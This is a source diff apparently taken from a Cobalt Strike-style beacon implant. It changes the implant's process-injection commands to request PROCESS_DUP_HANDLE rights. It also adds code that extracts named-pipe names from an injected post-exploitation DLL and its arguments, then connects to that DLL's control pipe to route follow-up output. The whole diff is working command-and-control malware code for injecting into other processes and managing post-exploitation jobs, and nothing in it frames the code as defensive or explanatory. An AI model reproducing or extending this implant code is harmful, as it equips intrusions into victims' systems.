@@ -36,7 +36,7 @@ void command_inject_pid(char * buffer, int length, BOOL x86) {
 	offset = data_int(&parser);
 
 	/* open the process for some oh so subtle manipulation */
-	hProcess = beacon_OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
+	hProcess = beacon_OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, FALSE, pid);
 	if (hProcess == NULL) {
 		post_error_dd(0x21, pid, GetLastError());
 		return;
@@ -422,7 +422,7 @@ void command_job_spawn_user(char * buffer, int length, BOOL x86) {
 
 	/* explicit pid: inject into that process */
 	if (pid > 0) {
-		hProcess = beacon_OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
+		hProcess = beacon_OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, FALSE, pid);
 		if (hProcess == NULL) {
 			post_error_dd(0x21, pid, GetLastError());
 			return;
@@ -440,6 +440,60 @@ void command_job_spawn_user(char * buffer, int length, BOOL x86) {
 		}
 
 		inject_process_logic(NULL, hProcess, pid, dll, dllen, tOffset, parameter, plen);
+
+		/* A2: same CTRL pipe connection as the fork&run path (for bg mode) */
+		{
+			char pname[128];
+			HANDLE ctrl_h;
+			int fpos = -1;
+			int scan;
+			memset(pname, 0, sizeof(pname));
+			for (scan = 0; scan < dllen - 9; scan++) {
+				if (memcmp(dll + scan, "\\\\.\\pipe\\", 9) == 0) {
+					fpos = scan;
+					break;
+				}
+			}
+			if (fpos >= 0) {
+				for (scan = 0; scan < 120 && fpos + scan < dllen; scan++) {
+					char c = dll[fpos + scan];
+					if (c == 0) break;
+					pname[scan] = c;
+				}
+				spawn_log("jsu: ctrl pipe inject2=", (long)pname);
+				/* C-36: carry the kit OUTPUT pipe name for follow-up reconnects */
+				{
+					char outname[64];
+					char desc[64];
+					int scan2;
+					int k;
+					memset(outname, 0, sizeof(outname));
+					for (scan2 = 0; parameter != NULL && scan2 < (int)plen - 9; scan2++) {
+						if (memcmp(parameter + scan2, "\\\\.\\pipe\\", 9) == 0) {
+							for (k = 0; k < 60 && scan2 + k < (int)plen; k++) {
+								char c = parameter[scan2 + k];
+								if (c == 0) break;
+								outname[k] = c;
+							}
+							outname[k] = 0;
+							break;
+						}
+					}
+					if (outname[0] != 0) {
+						_snprintf(desc, sizeof(desc), "postex_ctrl|%s", outname);
+					}
+					else {
+						_snprintf(desc, sizeof(desc), "postex_ctrl");
+					}
+					Sleep(2000);
+					if (connect_pipe(pname, &ctrl_h)) {
+						pipe_track(ctrl_h, (DWORD)pid, CALLBACK_OUTPUT, desc, JOB_MODE_BYTE);
+						spawn_log("jsu: ctrl tracked inject2", 0x7fffffff);
+					}
+				}
+			}
+		}
+
 		CloseHandle(hProcess);
 		return;
 	}
@@ -465,6 +519,69 @@ void command_job_spawn_user(char * buffer, int length, BOOL x86) {
 
 	inject_process_logic(&pi, pi.hProcess, pi.dwProcessId, dll, dllen, tOffset, parameter, plen);
 	spawn_log("jsu: ipl returned", 0x7fffffff);
+
+	/* A2: connect to the kit DLL's CTRL pipe for bg follow-up routing.
+	 * The DLL creates its pipe server during DllMain (StartNamedPipeServer)
+	 * and blocks in ConnectNamedPipe waiting for the beacon to connect.
+	 * Search the DLL binary for the patched pipe name (\\.\pipe\<name>) and
+	 * connect. Track via pipe_track so command_job_data can find it. */
+	{
+		char pname[128];
+		HANDLE ctrl_h;
+		int fpos = -1;
+		int scan;
+		memset(pname, 0, sizeof(pname));
+		for (scan = 0; scan < dllen - 9; scan++) {
+			if (memcmp(dll + scan, "\\\\.\\pipe\\", 9) == 0) {
+				fpos = scan;
+				break;
+			}
+		}
+		if (fpos >= 0) {
+			for (scan = 0; scan < 120 && fpos + scan < dllen; scan++) {
+				char c = dll[fpos + scan];
+				if (c == 0) break;
+				pname[scan] = c;
+			}
+			spawn_log("jsu: ctrl pipe=", (long)pname);
+			/* C-36: also grab the kit's OUTPUT pipe name from the postex
+			 * args blob (the only \.\pipe\ string there) and carry it in
+			 * the tracked description - command_job_data needs it to
+			 * reconnect the new OUT pipe instance each follow-up spawns. */
+			{
+				char outname[64];
+				char desc[64];
+				int scan2;
+				int k;
+				memset(outname, 0, sizeof(outname));
+				for (scan2 = 0; parameter != NULL && scan2 < (int)plen - 9; scan2++) {
+					if (memcmp(parameter + scan2, "\\\\.\\pipe\\", 9) == 0) {
+						for (k = 0; k < 60 && scan2 + k < (int)plen; k++) {
+							char c = parameter[scan2 + k];
+							if (c == 0) break;
+							outname[k] = c;
+						}
+						outname[k] = 0;
+						break;
+					}
+				}
+				if (outname[0] != 0) {
+					_snprintf(desc, sizeof(desc), "postex_ctrl|%s", outname);
+				}
+				else {
+					_snprintf(desc, sizeof(desc), "postex_ctrl");
+				}
+				Sleep(2000);
+				if (connect_pipe(pname, &ctrl_h)) {
+					pipe_track(ctrl_h, pi.dwProcessId, CALLBACK_OUTPUT, desc, JOB_MODE_BYTE);
+					spawn_log("jsu: ctrl tracked", 0x7fffffff);
+				}
+				else {
+					spawn_log("jsu: ctrl connect failed gle=", (long)GetLastError());
+				}
+			}
+		}
+	}
 
 	token_guard_stop_maybe(TRUE);
 
